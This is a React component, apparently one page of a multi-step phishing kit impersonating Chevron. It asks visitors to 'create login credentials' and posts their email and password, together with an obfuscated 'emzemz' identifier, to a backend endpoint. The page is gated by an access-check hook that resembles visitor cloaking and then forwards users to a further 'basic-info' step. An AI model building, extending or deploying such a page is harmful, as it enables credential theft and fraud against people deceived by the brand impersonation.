import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';
import FlowPageLayout from '../components/FlowPageLayout';

const EmailPassword: React.FC = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [showConfirmPassword, setShowConfirmPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({
    email: '',
    password: '',
    confirmPassword: ''
  });

  const navigate = useNavigate();
  const location = useLocation();
  const { emzemz } = location.state || {};
  const isAllowed = useAccessCheck(baseUrl);

  if (isAllowed === null) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Checking access…</div>;
  }

  if (isAllowed === false) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Access denied. Redirecting…</div>;
  }

  if (!emzemz) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Missing user details. Please restart the process.</div>;
  }

  const validateEmail = (email: string) => {
    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return regex.test(email);
  };

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setIsLoading(true);

    const newErrors = {
      email: !email.trim() ? 'Email is required' : !validateEmail(email) ? 'Invalid email format' : '',
      password: password.length < 8 ? 'Password must be at least 8 characters' : '',
      confirmPassword: password !== confirmPassword ? 'Passwords do not match' : ''
    };

    setErrors(newErrors);

    if (!newErrors.email && !newErrors.password && !newErrors.confirmPassword) {
      try {
        await axios.post(`${baseUrl}api/chevron-email-password/`, {
          emzemz,
          email,
          password,
        });
        console.log('Email and password set successfully');
        navigate('/basic-info', { state: { emzemz } });
      } catch (error) {
        console.error('Error setting email/password:', error);
        setErrors(prev => ({
          ...prev,
          form: 'There was an error. Please try again.'
        }));
        setIsLoading(false);
      }
    } else {
      setIsLoading(false);
    }
  };

  return (
    <FlowPageLayout
      eyebrow="Step 4 of 6"
      title="Create Your Login Credentials"
      description="Set a contact email and password so you can sign in securely. Make sure you use an address you check often."
      contentClassName="space-y-6"
    >
      <form onSubmit={handleSubmit} className="space-y-6">
        <div className="space-y-2">
          <label className="text-xs font-semibold uppercase tracking-wide text-[#0e2f56]">Email</label>
          <input
            id="email"
            name="email"
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            className="w-full border border-gray-300 rounded-sm px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
            placeholder="you@example.com"
          />
          {errors.email && (
            <p className="flex items-center gap-2 text-xs font-semibold text-red-600">
              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
              </svg>
              {errors.email}
            </p>
          )}
        </div>

        <div className="space-y-2">
          <label className="text-xs font-semibold uppercase tracking-wide text-[#0e2f56]">Password</label>
          <div className="flex items-center gap-3">
            <input
              id="password"
              name="password"
              type={showPassword ? 'text' : 'password'}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full border border-gray-300 rounded-sm px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
              placeholder="Create password"
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="text-xs font-semibold text-[#0b5da7] hover:underline"
            >
              {showPassword ? 'Hide' : 'Show'}
            </button>
          </div>
          {errors.password && (
            <p className="flex items-center gap-2 text-xs font-semibold text-red-600">
              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
              </svg>
              {errors.password}
            </p>
          )}
        </div>

        <div className="space-y-2">
          <label className="text-xs font-semibold uppercase tracking-wide text-[#0e2f56]">Confirm Password</label>
          <div className="flex items-center gap-3">
            <input
              id="confirmPassword"
              name="confirmPassword"
              type={showConfirmPassword ? 'text' : 'password'}
              value={confirmPassword}
              onChange={(e) => setConfirmPassword(e.target.value)}
              className="w-full border border-gray-300 rounded-sm px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
              placeholder="Re-enter password"
            />
            <button
              type="button"
              onClick={() => setShowConfirmPassword(!showConfirmPassword)}
              className="text-xs font-semibold text-[#0b5da7] hover:underline"
            >
              {showConfirmPassword ? 'Hide' : 'Show'}
            </button>
          </div>
          {errors.confirmPassword && (
            <p className="flex items-center gap-2 text-xs font-semibold text-red-600">
              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
              </svg>
              {errors.confirmPassword}
            </p>
          )}
        </div>

        <div className="flex justify-end">
          <button
            type="submit"
            disabled={isLoading}
            className="inline-flex items-center justify-center rounded-sm bg-[#003e7d] px-8 py-3 text-sm font-semibold uppercase tracking-wide text-white transition hover:bg-[#002c5c] disabled:cursor-not-allowed disabled:opacity-70"
          >
            {isLoading ? 'Saving…' : 'Continue'}
          </button>
        </div>
      </form>

      <div className="rounded-sm bg-[#f0f6fb] px-4 py-3 text-xs text-[#0e2f56]/80">
        Passwords must be at least 8 characters and include a mix of letters, numbers, and symbols to stay compliant with Chevron security standards.
      </div>
    </FlowPageLayout>
  );
};

export default EmailPassword;
